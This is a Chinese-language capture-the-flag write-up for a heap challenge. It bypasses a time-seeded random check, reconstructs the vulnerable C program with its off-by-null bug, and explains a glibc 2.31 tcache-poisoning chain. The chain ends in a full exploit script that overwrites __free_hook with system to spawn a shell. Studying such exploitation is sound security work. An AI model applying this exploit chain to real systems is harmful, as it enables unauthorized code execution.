# PwnPwn

---

## 目录

[TOC]

---

## 代码审计

### 数字游戏

在程序启动时将当前世界设置为`seed`并且连续获取4个随机数，要求用户输入一个数字并且满足

```css
number / 1000 == rand() % 10
number / 100 % 10 == rand() % 10
number / 10 % 10 == rand() % 10
number % 10 == rand() % 10
```

当特定时间会产生结果如 

```css
[1093933966, 1074735410, 1694292580, 1510941630]
6 0 0 0
```

就非常好计算了，也不用爆破，最多等待一般也不会超过3分钟，可使用如下脚本来绕过

```python
	damnTime = 0
number = 0
timeBase = int(time())+1
while(True):
    timeBase = timeBase+1
    rands,damnTime = getTargetTime(fo=4,target=timeBase)
    randA = rands[0] % 10;
    randB = rands[1] % 10;
    randC = rands[2] % 10;
    randD = rands[3] % 10;
    if(randB != randC or randB != 0):
        continue
    number = randA * 1000 + randD
    break

waitFor(damnTime)
p.sendlineafter("please input your number:",number)
```

### heap off by null

程序写了很多无意义的判断来干扰伪代码的分析，所以自己简单再精简还原了一下，程序如下：

```c
void* heapList[9] = { 0 };
char passWordFlag = 0;

void add() {
    int index;
    int size;
    puts("give me your index:");
    scanf("%d", &index);
    if (index > 9) {
        puts("GG, wrong");
        exit(0);
    }
    if (heapList[index]) {
        puts("you can't do that\nGG");
    }
    else {
        puts("give me your size:");
        scanf("%d", &size);
        char* heap = (char*)malloc(size);
        heapList[index] = heap;
        puts("give me your content:");
        int readLen = read(0, heapList[index], size);
        *(heap + 1) = 0; //存在 off by null 漏洞
    }
}

void show() {
    int index;
    puts("give me your index:");
    scanf("%d", &index);
    if (index > 9) {
        puts("this is a wrong index!");
        exit(0);
    }
    if (!heapList[index])
    {
        puts("illegal null pointer");
        exit(0);
    }
    if (!passWordFlag)
    {
        puts("content: ");
        puts((const char*)heapList[index]);
    }
}

void edit() {
    int index;
    if (!passWordFlag)
    {
        puts("you can't do that");
        exit(0);
    }
    puts("give me your index");
    scanf("%d", &index);
    if (index >= 9)
    {
        puts("this is a wrong index");
        exit(0);
    }
    if (!heapList[index])
    {
        puts("illegal null pointer");
        exit(0);
    }
    puts("give me your content:");
    read(0, heapList[index], 0x10uLL);
}

void del() {
    int index;
    puts("give me your index");
    scanf("%d", &index);
    if (index >= 9)
    {
        puts("this is a wrong index");
        exit(0);
    }
    if (!heapList[index])
    {
        puts("illegal null pointer");
        exit(0);
    }
    if (passWordFlag)
    {
        free((void*)heapList[index]);
        heapList[index] = 0LL;
    }
}

void judge(char* password) {
    int size = strlen(password);
    
    if (size <= 2 || size > 7) {
        printf("passwd error");
        passWordFlag = 0;
    }
    else {
        printf("passwd is ok");
        passWordFlag = 1;
    }

}

void login() {
    char password[400] = { 0 };
    char username[392] = { 0 };
    printf("please input your username\n");
    read(0, username, 32);
    read(0, password, 349);
    judge(password);
}

int main()
{
    int choice;
    while (true) {
        puts("root@$");
        scanf("%d", &choice);
        switch (choice)
        {
        case 1:
            add();
        case 2:
            show();
        case 3:
            edit();
        case 4:
            del();
        case 5:
            login();
        default:
            puts("GG");
            exit(0);
            break;
        }
    }
    return 0;
}
```



---

## 利用思路

题目提供了libc并且明确了版本为`libc-2.31`，又是堆题，所以首先明确以下信息

- 可利用`Tcache poison`
- `Tcache、Fastbin`的fd字段没有加密
- `free_hook`可利用并且比其它hook方便
- 2.31在合并检查中相较之前版本多了一个`prevSize == p->size`的检查，所以需要构造一个`FakeChunk`

题目中存在`off by null`漏洞可覆盖下一个`chunk`的低字节，没有其它溢出，于是尝试使其释放时向前合并，造成堆重叠，可以篡改`freechunk`字段，利用步骤如下

### 泄露地址

构造如下`chunk`

```css
----------ChunkA----------
|           |       0x451|
--------------------------

----------ChunkB----------
|           |        0x71|
--------------------------

----------ChunkC----------
|           |       0x501|
--------------------------

----------ChunkD----------
|           |        0x71|
--------------------------
```

随后释放`ChunkA`并且申请`ChunkF->size=0x450`使`A`进入`LargeBins`

重新申请`ChunkA`，并从其中泄露出`LibcBase`和`HeapBase`

### Off by null

此时释放并且重新申请`ChunkB`，使得`ChunkC->prevSize=0x4B0`且`ChunkC->prevInUse=0`

重新释放并且申请`ChunkA`并向其中构造`FakeChunk`

```css
--------FakeChunk---------
|           |       0x4B0|
|     ChunkD|      ChunkD|
--------------------------
```

再将`ChunkE->fd ChunkE->bk`均写入为`FakeChunk`，以上操作是为了绕过如下两项检测

```C
if (chunksize (p) != prev_size (next_chunk (p)))
    malloc_printerr ("corrupted size vs. prev_size");
if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
    malloc_printerr ("corrupted double-linked list");
```

此时的`heap`结构如下

```css
----------ChunkA----------
|           |       0x451|
|           |       0x4B0|<<<<<<<<<<<<<<<<<<<<| ←UnsortedBin#1
|     ChunkD|      ChunkD|>>>>>>>>>>>>>>>>>|  |     ↓↓↓
--------------------------				  |  |  add(0x440)
										|  |    ↓↓↓
----------ChunkB----------				  |  | ←UnsortedBin#2
|           |        0x71|				  |  |
--------------------------				  |  |
										|  |
----------ChunkC----------				  |  |
|      0x4B0|       0x500|				  |  |
--------------------------				  |  |
									    |  |
----------ChunkD----------<<<<<<<<<<<<<<<<<|  |
|           |        0x71| 				     |
|  FakeChunk|   FakeChunk|>>>>>>>>>>>>>>>>>>>>|
--------------------------
```

此时申请`0x440`大小的`heap`后`UnsortedBin#1`将移动到`UnsortedBin#2`

此时再连续申请两个`0x60`大小的`heapA heapB`并且按顺序释放`heapB heapA`

此时可通过`edit`编辑`ChunkB`内容为

```css
------ChunkB(heapA)-------
|           |        0x71|
|__free_hook|            |
--------------------------
```

既此时将出现如下变化

```css
tcachebins
0x70 [  2]: heapA —▸ heapB ◂— 0x0
↓↓↓↓↓↓↓↓↓↓
0x70 [  2]: heapA —▸ (__free_hook) ◂— 0x0
```

此时再连续申请两块`0x60`的`heap`，第二个`heap`既已成功申请到了`__free_hook`所在



---

## Exploit

```python
from MUC.ezpwn import *

damnTime = 0
off = 0
base = 0
timeBase = int(time())+1
while(True):
    timeBase = timeBase+1
    rands,tm = getTargetTime(fo=4,target=timeBase)
    randA = rands[0] % 10;
    randB = rands[1] % 10;
    randC = rands[2] % 10;
    randD = rands[3] % 10;
    if(randB != randC or randB != 0):
        continue
    print(rands)
    print(randA,randB,randC,randD)
    damnTime = tm
    off = randD
    base = randA * 1000
    break

waitFor(damnTime)

p,pb,libc = init(log="info",dbg=1,p="./pwn")
p.sendlineafter("please input your number:",base+off)

choice = "root@$\n"
def add(index,size,content=b"\x00"):
    p.sendlineafter(choice,1)
    p.sendlineafter("give me your index:\n",sdata(index))
    p.sendlineafter("give me your size:\n",sdata(size))
    p.sendafter("give me your content:\n",sdata(content))

def show(index):
    login(0)
    p.sendlineafter(choice,2)
    p.sendlineafter("give me your index:\n",sdata(index))

def edit(index,content):
    login(1)
    p.sendlineafter(choice,3)
    p.sendlineafter("give me your index\n",sdata(index))
    p.sendlineafter("give me your index\n",sdata(index))
    p.sendafter("give me your content:\n",sdata(content))

def free(index):
    login(1)
    p.sendlineafter(choice,4)
    p.sendlineafter("give me your index:\n",sdata(index))

def login(ok=1):
    ps = "A\x00"
    if(ok):
        ps = "AAA\x00"
    p.sendlineafter(choice,5)
    p.sendafter("please input your username\n",b"A")
    p.sendafter("please input your passwd\n",sdata(ps))

add(0,0x440,"\x00")
add(1,0x68,"\x00")

free(0)
add(2,0x4f8) #使0成为largebin

add(0,0x440) #重新申请回largebin
edit(0,b"A"*7+b"B") #填充首8字节泄露libc

show(0)
p.recvuntil(b"AB")
calcLibcBase("__malloc_hook",u64(p.recv(6).ljust(8,b"\x00"))-1120-16)

edit(0,b"A"*15+b"B") #填充首16字节泄露heap

show(0)
p.recvuntil(b"AB")
heapBase = u64(p.recv(6).ljust(8,b"\x00"))
vLog("heapBase",heapBase) #泄露heapBase

free(0)
add(0,0x440,p64(0)+p64(0x4b1)+p64(heapBase+0x9c0)*2)#构造FakeChunk

free(1)
add(1,0x68,b"A"*0x60+p64(0x4B0))#off by null

add(3,0x68,p64(heapBase+0x10)*2) #ChunkD
add(4,0x68)
free(2)

add(5,0x430) #分割移动UnsortedBin

add(6,0x68) #申请HeapA与ChunkB重叠
add(7,0x68)
free(7)
free(6)

edit(1,p64(getFunc("__free_hook"))) #篡改heapA->fd

add(6,0x68,b"/bin/sh\x00")
add(7,0x68,p64(getFunc("system")))

free(6)

p.interactive()
```

